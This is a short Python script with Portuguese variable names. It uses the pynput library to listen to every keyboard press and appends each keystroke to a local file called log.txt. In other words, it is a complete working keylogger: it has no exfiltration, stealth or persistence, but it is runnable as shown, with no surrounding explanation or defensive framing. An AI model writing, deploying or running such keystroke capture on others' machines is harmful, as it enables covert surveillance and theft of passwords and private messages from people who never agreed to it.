from pynput import keyboard

arquivo_log = "log.txt"

def ao_pressionar(tecla):
    with open(arquivo_log, "a") as log:
        try:
            log.write(str(tecla.char))
        except AttributeError:
            log.write(f"[{tecla}]")

with keyboard.Listener(on_press=ao_pressionar) as listener:
    listener.join()
